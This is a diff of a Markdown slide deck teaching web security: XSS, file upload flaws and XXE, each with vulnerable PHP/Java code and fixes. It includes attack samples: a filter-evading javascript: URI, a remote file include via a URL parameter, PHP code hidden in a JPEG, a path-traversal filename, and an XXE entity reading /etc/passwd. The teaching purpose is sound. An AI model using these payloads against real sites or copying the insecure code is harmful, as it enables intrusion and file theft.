@@ -378,6 +378,7 @@ PHP examples this time (I'm not that familiar with JSP)
 
 ### Lesser Known XSS Vulnerabilities
 **href**, **src**, **style** and **&lt;style&gt;** allow javascript:alert('hi')
+**SVG** allows JavaScript
 
 ```php
 <a href="<?php echo $accountId>">link</a>
@@ -399,6 +400,10 @@ PHP examples this time (I'm not that familiar with JSP)
 <img style="<?php echo $accountId>"/>
 ```
 
+```xml
+<img src="uploaded.svg">
+```
+
 ```php
 <style><?php echo $accountId></style>
 ```
@@ -407,14 +412,14 @@ PHP examples this time (I'm not that familiar with JSP)
 $('<a>').html(response);  // use text() instead
 ```
 
-**Content-Type: text/html; charset=utf-8** for JSON responses
-
 --
 
 ### XSS Prevention
-
+* **Content-Type: application/json; charset=utf-8** for JSON responses
+* Have I mentioned SVG? If needed consider serving from a different domain
+* If user supplied HTML is needed, use a whitelist xml parser (why? Did you test for injecting AngularJS directives :D?)
 * Escape based on usage
-* Validate URIs for **src** and **href**
+* Whitelist URIs for **src** and **href** (Why? Because &lt;img src="jav	ascript:alert('XSS');"> and tons of other ways)
 * Do not use dynamic CSS style sheets
 * [Consult the prevention sheet](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet#XSS_Prevention_Rules_Summary), too much possibilities
 * Use [CSP](https://developer.mozilla.org/en-US/docs/Web/Security/CSP)
@@ -434,6 +439,7 @@ More on [https://www.owasp.org/index.php/Session_Management_Cheat_Sheet](https:/
 --
 
 ### File Upload Vulnerability
+Facepalm ahead
 
 ```php
 if(preg_match('~^[a-z_\.0-9]+\.(jp[e]?g|png|gif)$~i', $filename)) {
@@ -465,11 +471,34 @@ if (@getimagesize($_FILES["file"]["tmp_name"]) !== false) {
 ### File Upload Attack
 
 ```php
+include($_GET['id'] '.php');
+```
+
+```
+GET /?id=myuploaded.php
+GET /?id=http://myserver/evil
+```
+
+
+```php
+if (@getimagesize($_FILES["file"]["tmp_name"]) !== false) {
+    $destination = "uploads/" . $_FILES["file"]["name"];
+    move_uploaded_file($_FILES["file"]["tmp_name"], $destination);  // see next slide
+}
 if(preg_match('~^[a-z_\.0-9]+\.(jp[e]?g|png|gif)$~i', $filename)) {
     require($filename);
 }
 ```
-Upload an image which embeds php tags (<?php ?>)
+
+Embed comment in jpeg (Parser stops before parsing garbage image data)
+
+```php
+<?php do_something_evil(); __halt_compiler();
+```
+
+--
+
+### File Upload Attack 2
 
 ```php
 if (in_array($_FILES["file"]["type"], ["image/gif", "image/png"])) {
@@ -477,6 +506,8 @@ if (in_array($_FILES["file"]["type"], ["image/gif", "image/png"])) {
     move_uploaded_file($_FILES["file"]["tmp_name"], $destination);
 }
 ```
+
+Two ways (and they can be combined \o/):
 
 ```http
 Content-Type: multipart/form-data; boundary=----ThisIsABoundary
@@ -489,38 +520,25 @@ Content-Type: image/jpeg
  ------ThisIsABoundary--
 ```
 
-```php
-include($_GET['id'] '.php');
-```
-
-```
-GET /?id=myuploaded.php
-```
+Filename: ../../unsafe/directory/myfile.php
 
 --
 
-### File Upload Attack 2
+### File Upload Attack 3
 
-```php
-if (@getimagesize($_FILES["file"]["tmp_name"]) !== false) {
-    $destination = "uploads/" . $_FILES["file"]["name"];
-    move_uploaded_file($_FILES["file"]["tmp_name"], $destination);
-}
-```
+Apache feature: [Double Extensions](https://www.acunetix.com/websitesecurity/upload-forms-threat/) ❀(*´◡`*)❀
 
-Embed comment in jpeg
+> Files can have more than one extension, and the order of the extensions is normally irrelevant. For example, if the file welcome.html.fr maps onto content type text/html and language French then the file welcome.fr.html will map onto exactly the same information. If more than one extension is given which maps onto the same type of meta-information, then the one to the right will be used, except for languages and content encodings. For example, if .gif maps to the MIME-type image/gif and .html maps to the MIME-type text/html, then the file welcome.gif.html will be associated with the MIME-type text/html.
 
-```php
-<?php do_something_evil(); __halt_compiler();
-```
-
-Parser stops before parsing garbage image data
+If we don't specify 123 as mime-type, **file.php.123** will be executed as PHP m/
 
 --
 
 ### File Upload Prevention
-
-* Do not execute anything from the upload directory
+* Generate filename, **NEVER, EVER** use user supplied mime types or names (**$_FILES[‘uploadedfile’][‘name’]:**, **$_FILES[‘uploadedfile’][‘type’]**)
+* NodeJS same issue
+* Do not execute anything from the upload directory (no include, require)
+* Use a dumb file upload server (nginx) + research configs
 * Do not require/include anything from the upload directory
 * Disallow special files (.htaccess, [.user.ini](http://php.net/manual/en/configuration.file.per-user.php), web.config, robots.txt, crossdomain.xml, clientaccesspolicy.xml) and turn off .htaccess parsing
 * Remove executable bits from uploads (644)
@@ -530,7 +548,24 @@ Parser stops before parsing garbage image data
 * [http://nullcandy.com/php-image-upload-security-how-not-to-do-it/](http://nullcandy.com/php-image-upload-security-how-not-to-do-it/)
 --
 
-### XXE
+### XXE Vulnerability
+
+**Java**:
+```java
+DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
+DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
+Document doc = dBuilder.parse(userSuppliedXml);
+```
+
+**PHP:**
+```php
+$dom = new DomDocument($userSuppliedXml);
+echo $dom->saveXml();
+```
+
+--
+
+### XXE Attack
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -539,14 +574,29 @@ Parser stops before parsing garbage image data
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
 ```
 
+--
+
+### XXE Prevention
+
 * Disable XML External Entity Processing!
 
+**Java**:
 ```java
 DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
 FEATURE = "http://xml.org/sax/features/external-general-entities";
 dbf.setFeature(FEATURE, false);
 ```
 
+**PHP**:
+```php
+$default = libxml_disable_entity_loader(true);
+$dom = new DomDocument($userSuppliedXml);
+libxml_disable_entity_loader(false);
+
+echo $dom->saveXml();
+```
+
+**libxml_disable_entity_loader** not threadsafe on php-fpm, use [ZendXML](https://github.com/zendframework/ZendXml)
 --
 
 ### CSRF
